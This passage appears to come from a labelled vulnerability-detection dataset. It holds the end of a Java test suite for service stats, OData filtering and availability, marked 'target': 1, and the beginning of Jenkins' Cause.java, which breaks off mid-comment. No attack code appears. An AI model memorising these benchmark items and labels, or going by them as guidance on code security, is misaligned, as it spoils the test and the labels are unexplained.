this.host.sendAndWaitExpectSuccess(Operation.createPut(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        allStats = getStats(exampleServiceState);\n        retStatEntry = allStats.entries.get(\"key1\");\n        assertTrue(retStatEntry.accumulatedValue == 75);\n        assertTrue(retStatEntry.latestValue == 75);\n        assertTrue(retStatEntry.version == 1);\n        assertTrue(retStatEntry.unit.equals(\"replaceUnit\"));\n        assertTrue(retStatEntry.sourceTimeMicrosUtc == null);\n\n        // Step 6 - Issue a bulk PUT and verify that the complete set of stats is updated\n        ServiceStats stats = new ServiceStats();\n        stat.name = \"key3\";\n        stat.latestValue = 200;\n        stat.unit = \"unit3\";\n        stats.entries.put(\"key3\", stat);\n        this.host.sendAndWaitExpectSuccess(Operation.createPut(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stats));\n        allStats = getStats(exampleServiceState);\n        if (allStats.entries.size() != 1) {\n            // there is a possibility of node group maintenance kicking in and adding a stat\n            ServiceStat nodeGroupStat = allStats.entries.get(\n                    Service.STAT_NAME_NODE_GROUP_CHANGE_MAINTENANCE_COUNT);\n\n            if (nodeGroupStat == null) {\n                throw new IllegalStateException(\n                        \"Expected single stat, got: \" + Utils.toJsonHtml(allStats));\n            }\n        }\n        retStatEntry = allStats.entries.get(\"key3\");\n        assertTrue(retStatEntry.accumulatedValue == 200);\n        assertTrue(retStatEntry.latestValue == 200);\n        assertTrue(retStatEntry.version == 1);\n        assertTrue(retStatEntry.unit.equals(\"unit3\"));\n\n        // Step 7 - Issue a PATCH and verify that the latestValue is updated\n        stat.latestValue = 25;\n        this.host.sendAndWaitExpectSuccess(Operation.createPatch(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        allStats = getStats(exampleServiceState);\n        retStatEntry = allStats.entries.get(\"key3\");\n        assertTrue(retStatEntry.latestValue == 225);\n        assertTrue(retStatEntry.version == 2);\n\n        verifyGetWithODataOnStats(exampleServiceState);\n\n        verifyStatCreationAttemptAfterGet();\n\n    }\n\n    private void verifyGetWithODataOnStats(ExampleServiceState exampleServiceState) {\n        URI exampleStatsUri = UriUtils.buildStatsUri(this.host,\n                exampleServiceState.documentSelfLink);\n        // bulk PUT to set stats to a known state\n        ServiceStats stats = new ServiceStats();\n        stats.kind = ServiceStats.KIND;\n        ServiceStat stat = new ServiceStat();\n        stat.name = \"key1\";\n        stat.latestValue = 100;\n        stats.entries.put(stat.name, stat);\n        stat = new ServiceStat();\n        stat.name = \"key2\";\n        stat.latestValue = 0.0;\n        stats.entries.put(stat.name, stat);\n        stat = new ServiceStat();\n        stat.name = \"key3\";\n        stat.latestValue = -200;\n        stats.entries.put(stat.name, stat);\n        stat = new ServiceStat();\n        stat.name = \"someKey\" + ServiceStats.STAT_NAME_SUFFIX_PER_DAY;\n        stat.latestValue = 1000;\n        stats.entries.put(stat.name, stat);\n        stat = new ServiceStat();\n        stat.name = \"someOtherKey\" + ServiceStats.STAT_NAME_SUFFIX_PER_DAY;\n        stat.latestValue = 2000;\n        stats.entries.put(stat.name, stat);\n        this.host.sendAndWaitExpectSuccess(Operation.createPut(exampleStatsUri).setBody(stats));\n\n        // negative tests\n        URI exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_COUNT, Boolean.TRUE.toString());\n        this.host.sendAndWaitExpectFailure(Operation.createGet(exampleStatsUriWithODATA));\n\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_ORDER_BY, \"name\");\n        this.host.sendAndWaitExpectFailure(Operation.createGet(exampleStatsUriWithODATA));\n\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_SKIP_TO, \"100\");\n        this.host.sendAndWaitExpectFailure(Operation.createGet(exampleStatsUriWithODATA));\n\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_TOP, \"100\");\n        this.host.sendAndWaitExpectFailure(Operation.createGet(exampleStatsUriWithODATA));\n\n        // attempt long value LE on latestVersion, should fail\n        String odataFilterValue = String.format(\"%s le %d\",\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                1001);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        this.host.sendAndWaitExpectFailure(Operation.createGet(exampleStatsUriWithODATA));\n\n        // Positive filter tests\n        String statName = \"key1\";\n        // test filter for exact match\n        odataFilterValue = String.format(\"%s eq %s\",\n                ServiceStat.FIELD_NAME_NAME,\n                statName);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        ServiceStats filteredStats = getStats(exampleStatsUriWithODATA);\n        assertTrue(filteredStats.entries.size() == 1);\n        assertTrue(filteredStats.entries.containsKey(statName));\n\n        // test filter with prefix match\n        odataFilterValue = String.format(\"%s eq %s*\",\n                ServiceStat.FIELD_NAME_NAME,\n                \"key\");\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        // three entries start with \"key\"\n        assertTrue(filteredStats.entries.size() == 3);\n        assertTrue(filteredStats.entries.containsKey(\"key1\"));\n        assertTrue(filteredStats.entries.containsKey(\"key2\"));\n        assertTrue(filteredStats.entries.containsKey(\"key3\"));\n\n        // test filter with suffix match, common for time series filtering\n        odataFilterValue = String.format(\"%s eq *%s\",\n                ServiceStat.FIELD_NAME_NAME,\n                ServiceStats.STAT_NAME_SUFFIX_PER_DAY);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        // two entries end with \"Day\"\n        assertTrue(filteredStats.entries.size() == 2);\n        assertTrue(filteredStats.entries\n                .containsKey(\"someKey\" + ServiceStats.STAT_NAME_SUFFIX_PER_DAY));\n        assertTrue(filteredStats.entries\n                .containsKey(\"someOtherKey\" + ServiceStats.STAT_NAME_SUFFIX_PER_DAY));\n\n        // filter on latestValue, GE\n        odataFilterValue = String.format(\"%s ge %f\",\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                0.0);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        assertTrue(filteredStats.entries.size() == 4);\n\n        // filter on latestValue, GT\n        odataFilterValue = String.format(\"%s gt %f\",\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                0.0);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        assertTrue(filteredStats.entries.size() == 3);\n\n        // filter on latestValue, eq\n        odataFilterValue = String.format(\"%s eq %f\",\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                -200.0);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        assertTrue(filteredStats.entries.size() == 1);\n\n        // filter on latestValue, le\n        odataFilterValue = String.format(\"%s le %f\",\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                1000.0);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        assertTrue(filteredStats.entries.size() == 2);\n\n        // filter on latestValue, lt AND gt\n        odataFilterValue = String.format(\"%s lt %f and %s gt %f\",\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                2000.0,\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                1000.0);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        // two entries end with \"Day\"\n        assertTrue(filteredStats.entries.size() == 0);\n\n        // test dual filter with suffix match, and latest value LEQ\n        odataFilterValue = String.format(\"%s eq *%s and %s le %f\",\n                ServiceStat.FIELD_NAME_NAME,\n                ServiceStats.STAT_NAME_SUFFIX_PER_DAY,\n                ServiceStat.FIELD_NAME_LATEST_VALUE,\n                1001.0);\n        exampleStatsUriWithODATA = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        filteredStats = getStats(exampleStatsUriWithODATA);\n        // single entry ends with \"Day\" and has latestValue <= 1000\n        assertTrue(filteredStats.entries.size() == 1);\n        assertTrue(filteredStats.entries\n                .containsKey(\"someKey\" + ServiceStats.STAT_NAME_SUFFIX_PER_DAY));\n\n    }\n\n    private void verifyStatCreationAttemptAfterGet() throws Throwable {\n        // Create a stat without a log histogram or time series, then try to recreate with\n        // the extra features and make sure its updated\n\n        List<Service> services = this.host.doThroughputServiceStart(\n                1, MinimalTestService.class,\n                this.host.buildMinimalTestState(), EnumSet.of(ServiceOption.INSTRUMENTATION), null);\n\n        final String statName = \"foo\";\n        for (Service service : services) {\n            service.setStat(statName, 1.0);\n            ServiceStat st = service.getStat(statName);\n            assertTrue(st.timeSeriesStats == null);\n            assertTrue(st.logHistogram == null);\n            ServiceStat stNew = new ServiceStat();\n            stNew.name = statName;\n            stNew.logHistogram = new ServiceStatLogHistogram();\n            stNew.timeSeriesStats = new TimeSeriesStats(60,\n                    TimeUnit.MINUTES.toMillis(1), EnumSet.of(AggregationType.AVG));\n            service.setStat(stNew, 11.0);\n            st = service.getStat(statName);\n            assertTrue(st.timeSeriesStats != null);\n            assertTrue(st.logHistogram != null);\n        }\n    }\n\n    private ServiceStats getStats(ExampleServiceState exampleServiceState) {\n        return this.host.getServiceState(null, ServiceStats.class, UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink));\n    }\n\n    private ServiceStats getStats(URI statsUri) {\n        return this.host.getServiceState(null, ServiceStats.class, statsUri);\n    }\n\n    @Test\n    public void testTimeSeriesStats() throws Throwable {\n        long startTime = TimeUnit.MILLISECONDS.toMicros(System.currentTimeMillis());\n        int numBins = 4;\n        long interval = 1000;\n        double value = 100;\n        // set data to fill up the specified number of bins\n        TimeSeriesStats timeSeriesStats = new TimeSeriesStats(numBins, interval,\n                EnumSet.allOf(AggregationType.class));\n        for (int i = 0; i < numBins; i++) {\n            startTime += TimeUnit.MILLISECONDS.toMicros(interval);\n            value += 1;\n            timeSeriesStats.add(startTime, value, 1);\n        }\n        assertTrue(timeSeriesStats.bins.size() == numBins);\n\n        // insert additional unique datapoints; the earliest entries should be dropped\n        for (int i = 0; i < numBins / 2; i++) {\n            startTime += TimeUnit.MILLISECONDS.toMicros(interval);\n            value += 1;\n            timeSeriesStats.add(startTime, value, 1);\n        }\n        assertTrue(timeSeriesStats.bins.size() == numBins);\n        long timeMicros = startTime - TimeUnit.MILLISECONDS.toMicros(interval * (numBins - 1));\n        long timeMillis = TimeUnit.MICROSECONDS.toMillis(timeMicros);\n        timeMillis -= (timeMillis % interval);\n        assertTrue(timeSeriesStats.bins.firstKey() == timeMillis);\n\n        // insert additional datapoints for an existing bin. The count should increase,\n        // min, max, average computed appropriately\n        double origValue = value;\n        double accumulatedValue = value;\n        double newValue = value;\n        double count = 1;\n        for (int i = 0; i < numBins / 2; i++) {\n            newValue++;\n            count++;\n            timeSeriesStats.add(startTime, newValue, 2);\n            accumulatedValue += newValue;\n        }\n        TimeBin lastBin = timeSeriesStats.bins.get(timeSeriesStats.bins.lastKey());\n        assertTrue(lastBin.avg.equals(accumulatedValue / count));\n        assertTrue(lastBin.var.equals((1.0 * numBins) / 2.0));\n        assertTrue(lastBin.sum.equals((2 * count) - 1));\n        assertTrue(lastBin.count == count);\n        assertTrue(lastBin.max.equals(newValue));\n        assertTrue(lastBin.min.equals(origValue));\n        assertTrue(lastBin.latest.equals(newValue));\n\n        // test with a subset of the aggregation types specified\n        timeSeriesStats = new TimeSeriesStats(numBins, interval, EnumSet.of(AggregationType.AVG));\n        timeSeriesStats.add(startTime, value, value);\n        lastBin = timeSeriesStats.bins.get(timeSeriesStats.bins.lastKey());\n        assertTrue(lastBin.avg != null);\n        assertTrue(lastBin.count != 0);\n        assertTrue(lastBin.sum == null);\n        assertTrue(lastBin.max == null);\n        assertTrue(lastBin.min == null);\n\n        timeSeriesStats = new TimeSeriesStats(numBins, interval, EnumSet.of(AggregationType.MIN,\n                AggregationType.MAX));\n        timeSeriesStats.add(startTime, value, value);\n        lastBin = timeSeriesStats.bins.get(timeSeriesStats.bins.lastKey());\n        assertTrue(lastBin.avg == null);\n        assertTrue(lastBin.count == 0);\n        assertTrue(lastBin.sum == null);\n        assertTrue(lastBin.max != null);\n        assertTrue(lastBin.min != null);\n\n        timeSeriesStats = new TimeSeriesStats(numBins, interval, EnumSet.of(AggregationType.LATEST));\n        timeSeriesStats.add(startTime, value, value);\n        lastBin = timeSeriesStats.bins.get(timeSeriesStats.bins.lastKey());\n        assertTrue(lastBin.avg == null);\n        assertTrue(lastBin.count == 0);\n        assertTrue(lastBin.sum == null);\n        assertTrue(lastBin.max == null);\n        assertTrue(lastBin.min == null);\n        assertTrue(lastBin.latest.equals(value));\n\n        // Step 2 - POST a stat to the service instance and verify we can fetch the stat just posted\n        String name = UUID.randomUUID().toString();\n        ExampleServiceState s = new ExampleServiceState();\n        s.name = name;\n        Consumer<Operation> bodySetter = (o) -> {\n            o.setBody(s);\n        };\n        URI factoryURI = UriUtils.buildFactoryUri(this.host, ExampleService.class);\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null, 1,\n                ExampleServiceState.class, bodySetter, factoryURI);\n        ExampleServiceState exampleServiceState = states.values().iterator().next();\n        ServiceStats.ServiceStat stat = new ServiceStat();\n        stat.name = \"key1\";\n        stat.latestValue = 100;\n        // set bin size to 1ms\n        stat.timeSeriesStats = new TimeSeriesStats(numBins, 1, EnumSet.allOf(AggregationType.class));\n        this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        for (int i = 0; i < numBins; i++) {\n            Thread.sleep(1);\n            this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                    this.host, exampleServiceState.documentSelfLink)).setBody(stat));\n        }\n        ServiceStats allStats = this.host.getServiceState(null, ServiceStats.class,\n                UriUtils.buildStatsUri(\n                        this.host, exampleServiceState.documentSelfLink));\n        ServiceStat retStatEntry = allStats.entries.get(stat.name);\n        assertTrue(retStatEntry.accumulatedValue == 100 * (numBins + 1));\n        assertTrue(retStatEntry.latestValue == 100);\n        assertTrue(retStatEntry.version == numBins + 1);\n        assertTrue(retStatEntry.timeSeriesStats.bins.size() == numBins);\n\n        // Step 3 - POST a stat to the service instance with sourceTimeMicrosUtc and verify we can fetch the stat just posted\n        String statName = UUID.randomUUID().toString();\n        ExampleServiceState exampleState = new ExampleServiceState();\n        exampleState.name = statName;\n        Consumer<Operation> setter = (o) -> {\n            o.setBody(exampleState);\n        };\n        Map<URI, ExampleServiceState> stateMap = this.host.doFactoryChildServiceStart(null, 1,\n                ExampleServiceState.class, setter,\n                UriUtils.buildFactoryUri(this.host, ExampleService.class));\n        ExampleServiceState returnExampleState = stateMap.values().iterator().next();\n        ServiceStats.ServiceStat sourceStat1 = new ServiceStat();\n        sourceStat1.name = \"sourceKey1\";\n        sourceStat1.latestValue = 100;\n        // Timestamp 946713600000000 equals Jan 1, 2000\n        Long sourceTimeMicrosUtc1 = 946713600000000L;\n        sourceStat1.sourceTimeMicrosUtc = sourceTimeMicrosUtc1;\n        ServiceStats.ServiceStat sourceStat2 = new ServiceStat();\n        sourceStat2.name = \"sourceKey2\";\n        sourceStat2.latestValue = 100;\n        // Timestamp 946713600000000 equals Jan 2, 2000\n        Long sourceTimeMicrosUtc2 = 946800000000000L;\n        sourceStat2.sourceTimeMicrosUtc = sourceTimeMicrosUtc2;\n        // set bucket size to 1ms\n        sourceStat1.timeSeriesStats = new TimeSeriesStats(numBins, 1, EnumSet.allOf(AggregationType.class));\n        sourceStat2.timeSeriesStats = new TimeSeriesStats(numBins, 1, EnumSet.allOf(AggregationType.class));\n        this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                this.host, returnExampleState.documentSelfLink)).setBody(sourceStat1));\n        this.host.sendAndWaitExpectSuccess(Operation.createPost(UriUtils.buildStatsUri(\n                this.host, returnExampleState.documentSelfLink)).setBody(sourceStat2));\n        allStats = getStats(returnExampleState);\n        retStatEntry = allStats.entries.get(sourceStat1.name);\n        assertTrue(retStatEntry.accumulatedValue == 100);\n        assertTrue(retStatEntry.latestValue == 100);\n        assertTrue(retStatEntry.version == 1);\n        assertTrue(retStatEntry.timeSeriesStats.bins.size() == 1);\n        assertTrue(retStatEntry.timeSeriesStats.bins.firstKey()\n                .equals(TimeUnit.MICROSECONDS.toMillis(sourceTimeMicrosUtc1)));\n\n        retStatEntry = allStats.entries.get(sourceStat2.name);\n        assertTrue(retStatEntry.accumulatedValue == 100);\n        assertTrue(retStatEntry.latestValue == 100);\n        assertTrue(retStatEntry.version == 1);\n        assertTrue(retStatEntry.timeSeriesStats.bins.size() == 1);\n        assertTrue(retStatEntry.timeSeriesStats.bins.firstKey()\n                .equals(TimeUnit.MICROSECONDS.toMillis(sourceTimeMicrosUtc2)));\n    }\n\n    public static class SetAvailableValidationService extends StatefulService {\n\n        public SetAvailableValidationService() {\n            super(ExampleServiceState.class);\n        }\n\n        @Override\n        public void handleStart(Operation op) {\n            setAvailable(false);\n            // we will transition to available only when we receive a special PATCH.\n            // This simulates a service that starts, but then self patch itself sometime\n            // later to indicate its done with some complex init. It does not do it in handle\n            // start, since it wants to make POST quick.\n            op.complete();\n        }\n\n        @Override\n        public void handlePatch(Operation op) {\n            // regardless of body, just become available\n            setAvailable(true);\n            op.complete();\n        }\n    }\n\n    @Test\n    public void failureOnReservedSuffixServiceStart() throws Throwable {\n        TestContext ctx = this.testCreate(ServiceHost.RESERVED_SERVICE_URI_PATHS.length);\n        for (String reservedSuffix : ServiceHost.RESERVED_SERVICE_URI_PATHS) {\n            Operation post = Operation.createPost(this.host,\n                    UUID.randomUUID().toString() + \"/\" + reservedSuffix)\n                    .setCompletion(ctx.getExpectedFailureCompletion());\n            this.host.startService(post, new MinimalTestService());\n        }\n        this.testWait(ctx);\n    }\n\n    @Test\n    public void testIsAvailableStatAndSuffix() throws Throwable {\n        long c = 1;\n        URI factoryURI = UriUtils.buildFactoryUri(this.host, ExampleService.class);\n        String name = UUID.randomUUID().toString();\n        ExampleServiceState s = new ExampleServiceState();\n        s.name = name;\n        Consumer<Operation> bodySetter = (o) -> {\n            o.setBody(s);\n        };\n        Map<URI, ExampleServiceState> states = this.host.doFactoryChildServiceStart(null, c,\n                ExampleServiceState.class, bodySetter, factoryURI);\n\n        // first verify that service that do not explicitly use the setAvailable method,\n        // appear available. Both a factory and a child service\n        this.host.waitForServiceAvailable(factoryURI);\n\n        // expect 200 from /factory/<child>/available\n        TestContext ctx = testCreate(states.size());\n        for (URI u : states.keySet()) {\n            Operation get = Operation.createGet(UriUtils.buildAvailableUri(u))\n                    .setCompletion(ctx.getCompletion());\n            this.host.send(get);\n        }\n        testWait(ctx);\n\n        // verify that PUT on /available can make it switch to unavailable (503)\n        ServiceStat body = new ServiceStat();\n        body.name = Service.STAT_NAME_AVAILABLE;\n        body.latestValue = 0.0;\n\n        Operation put = Operation.createPut(\n                UriUtils.buildAvailableUri(this.host, factoryURI.getPath()))\n                .setBody(body);\n        this.host.sendAndWaitExpectSuccess(put);\n\n        // verify factory now appears unavailable\n        Operation get = Operation.createGet(UriUtils.buildAvailableUri(factoryURI));\n        this.host.sendAndWaitExpectFailure(get);\n\n        // verify PUT on child services makes them unavailable\n        ctx = testCreate(states.size());\n        for (URI u : states.keySet()) {\n            put = put.clone().setUri(UriUtils.buildAvailableUri(u))\n                    .setBody(body)\n                    .setCompletion(ctx.getCompletion());\n            this.host.send(put);\n        }\n        testWait(ctx);\n\n        // expect 503 from /factory/<child>/available\n        ctx = testCreate(states.size());\n        for (URI u : states.keySet()) {\n            get = get.clone().setUri(UriUtils.buildAvailableUri(u))\n                    .setCompletion(ctx.getExpectedFailureCompletion());\n            this.host.send(get);\n        }\n        testWait(ctx);\n\n        // now validate a stateful service that is in memory, and explicitly calls setAvailable\n        // sometime after it starts\n        Service service = this.host.startServiceAndWait(new SetAvailableValidationService(),\n                UUID.randomUUID().toString(), new ExampleServiceState());\n\n        // verify service is NOT available, since we have not yet poked it, to become available\n        get = Operation.createGet(UriUtils.buildAvailableUri(service.getUri()));\n        this.host.sendAndWaitExpectFailure(get);\n\n        // send a PATCH to this special test service, to make it switch to available\n        Operation patch = Operation.createPatch(service.getUri())\n                .setBody(new ExampleServiceState());\n        this.host.sendAndWaitExpectSuccess(patch);\n\n        // verify service now appears available\n        get = Operation.createGet(UriUtils.buildAvailableUri(service.getUri()));\n        this.host.sendAndWaitExpectSuccess(get);\n    }\n\n    public void validateServiceUiHtmlResponse(Operation op) {\n        assertTrue(op.getStatusCode() == Operation.STATUS_CODE_MOVED_TEMP);\n        assertTrue(op.getResponseHeader(\"Location\").contains(\n                \"/core/ui/default/#\"));\n    }\n\n    public static void validateTimeSeriesStat(ServiceStat stat, long expectedBinDurationMillis) {\n        assertTrue(stat != null);\n        assertTrue(stat.timeSeriesStats != null);\n        assertTrue(stat.version >= 1);\n        assertEquals(expectedBinDurationMillis, stat.timeSeriesStats.binDurationMillis);\n        if (stat.timeSeriesStats.aggregationType.contains(AggregationType.AVG)) {\n            double maxCount = 0;\n            for (TimeBin bin : stat.timeSeriesStats.bins.values()) {\n                if (bin.count > maxCount) {\n                    maxCount = bin.count;\n                }\n            }\n            assertTrue(maxCount >= 1);\n        }\n    }\n\n    @Test\n    public void statsKeyOrder() {\n\n        ExampleServiceState state = new ExampleServiceState();\n        state.name = \"foo\";\n        Operation post = Operation.createPost(this.host, ExampleService.FACTORY_LINK).setBody(state);\n        state = this.sender.sendAndWait(post, ExampleServiceState.class);\n\n        ServiceStats stats = new ServiceStats();\n        ServiceStat stat = new ServiceStat();\n        stat.name = \"keyBBB\";\n        stat.latestValue = 10;\n        stats.entries.put(stat.name, stat);\n        stat = new ServiceStat();\n        stat.name = \"keyCCC\";\n        stat.latestValue = 10;\n        stats.entries.put(stat.name, stat);\n        stat = new ServiceStat();\n        stat.name = \"keyAAA\";\n        stat.latestValue = 10;\n        stats.entries.put(stat.name, stat);\n\n        URI exampleStatsUri = UriUtils.buildStatsUri(this.host, state.documentSelfLink);\n        this.sender.sendAndWait(Operation.createPut(exampleStatsUri).setBody(stats));\n\n        // odata stats prefix query\n        String odataFilterValue = String.format(\"%s eq %s*\", ServiceStat.FIELD_NAME_NAME, \"key\");\n        URI filteredStats = UriUtils.extendUriWithQuery(exampleStatsUri,\n                UriUtils.URI_PARAM_ODATA_FILTER, odataFilterValue);\n        ServiceStats result = getStats(filteredStats);\n\n        // verify stats key order\n        assertEquals(3, result.entries.size());\n        List<String> statList = new ArrayList<>(result.entries.keySet());\n        assertEquals(\"stat index 0\", \"keyAAA\", statList.get(0));\n        assertEquals(\"stat index 1\", \"keyBBB\", statList.get(1));\n        assertEquals(\"stat index 2\", \"keyCCC\", statList.get(2));\n    }\n\n}\n", "target": 1}
{"idx": 1059, "func": "/*\n * The MIT License\n *\n * Copyright (c) 2004-2010, Sun Microsystems, Inc., Michael B. Donohue, Seiji Sogabe\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\npackage hudson.model;\n\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\n\nimport hudson.console.ModelHyperlinkNote;\nimport hudson.diagnosis.OldDataMonitor;\nimport hudson.util.XStream2;\nimport jenkins.model.Jenkins;\nimport org.kohsuke.stapler.export.Exported;\nimport org.kohsuke.stapler.export.ExportedBean;\nimport com.thoughtworks.xstream.converters.UnmarshallingContext;\nimport java.util.HashSet;\nimport java.util.Set;\nimport javax.annotation.CheckForNull;\nimport javax.annotation.Nonnull;\n\n/**\n * Cause object base class.  This class hierarchy is used to keep track of why\n * a given build was started. This object encapsulates the UI rendering of the cause,\n * as well as providing more useful information in respective subypes.\n *\n * The Cause object is connected to a build via the {@link CauseAction} object.\n *\n * <h2>Views</h2>\n * <dl>\n * <dt>description.jelly\n * <dd>Renders the cause to HTML. By default, it puts the short description.\n * </dl>\n *\n * @author Michael Donohue\n * @see Run#getCauses()\n * @see Queue.Item#getCauses()\n */\n@ExportedBean\npublic abstract class Cause {\n    /**\n     * One-line human-readable text of the cause.\n     *\n     * <p>\n     * By default, this method is used to render HTML as well.\n     */\n    @Exported(visibility=3)\n    public abstract String getShortDescription();\n\n    /**\n     * Called when the cause is registered to {@link AbstractBuild}.\n     *\n     * @param build\n     *      never null\n     * @since 1.376\n     */\n    public void onAddedTo(AbstractBuild build) {}\n\n    /**\n     * Report a line to the listener about this cause.\n     * @since 1.362\n     */\n    public void print(TaskListener listener) {\n        listener.getLogger().println(getShortDescription());\n    }\n\n    /**\n     * Fall back implementation when no other type is available.\n     * @deprecated since 2009-02-08\n     */\n    public static class LegacyCodeCause extends Cause {\n        private StackTraceElement [] stackTrace;\n        public LegacyCodeCause() {\n            stackTrace = new Exception().getStackTrace();\n        }\n\n        @Override\n        public String getShortDescription() {\n            return Messages.Cause_LegacyCodeCause_ShortDescription();\n        }\n    }\n\n    /**\n     * A build is triggered by the completion of another build (AKA upstream build.)\n     */\n    public static class UpstreamCause extends Cause {\n\n        /**\n         * Maximum depth of transitive upstream causes we want to record.\n         */\n        private static final int MAX_DEPTH = 10;\n        /**\n         * Maximum number of transitive upstream causes we want to record.\n         */\n        private static final int MAX_LEAF = 25;\n        private String upstreamProject, upstreamUrl;\n        private int upstreamBuild;\n        /**\n         * @deprecated since 2009-02-28\n         */\n        @Deprecated\n        private transient Cause upstreamCause;\n        private @Nonnull List<Cause> upstreamCauses;\n\n        /**\n         * @deprecated since 2009-02-28\n         */\n        // for backward bytecode compatibility\n        public UpstreamCause(AbstractBuild<?,?> up) {\n            this((Run<?,?>)up);\n        }\n\n        public UpstreamCause(Run<?, ?> up) {\n            upstreamBuild = up.getNumber();\n            upstreamProject = up.getParent().getFullName();\n            upstreamUrl = up.getParent().getUrl();\n            upstreamCauses = new ArrayList<Cause>();\n            Set<String> traversed = new HashSet<String>();\n            for (Cause c : up.getCauses()) {\n                upstreamCauses.add(trim(c, MAX_DEPTH, traversed));\n            }\n        }\n\n        private UpstreamCause(String upstreamProject, int upstreamBuild, String upstreamUrl, @Nonnull List<Cause> upstreamCauses) {\n            this.upstreamProject = upstreamProject;\n            this.upstreamBuild = upstreamBuild;\n            this.upstreamUrl = upstreamUrl;\n            this.upstreamCauses = upstreamCauses;\n        }\n\n        private @Nonnull Cause trim(@Nonnull Cause c, int depth, Set<String> traversed) {\n            if (!(c instanceof UpstreamCause)) {\n                return c;\n            }\n            UpstreamCause uc = (UpstreamCause) c;\n            List<Cause> cs = new ArrayList<Cause>();\n            if (depth > 0) {\n                if (traversed.add(uc.upstreamUrl + uc.upstreamBuild)) {\n                    for (Cause c2 : uc.upstreamCauses) {\n                        cs.add(trim(c2, depth - 1, traversed));\n                    }\n                }\n            } else if (traversed.size() < MAX_LEAF) {\n                cs.add(new DeeplyNestedUpstreamCause());\n            }\n            return new UpstreamCause(uc.upstreamProject, uc.upstreamBuild, uc.upstreamUrl, cs);\n        }\n\n        /**\n         * Returns true if this cause points to a build in the specified job.\n         */\n        public boolean pointsTo(Job<?,?> j) {\n            return j.getFullName().equals(upstreamProject);\n        }\n\n        /**\n         * Returns true if this cause points to the specified build.\n         */\n        public boolean pointsTo(Run<?,?> r) {\n            return r.getNumber()==upstreamBuild && pointsTo(r.getParent());\n        }\n\n        @Exported(visibility=3)\n        public String getUpstreamProject() {\n            return upstreamProject;\n        }\n\n        @Exported(visibility=3)\n        public int getUpstreamBuild() {\n            return upstreamBuild;\n        }\n\n        /**\n         * @since 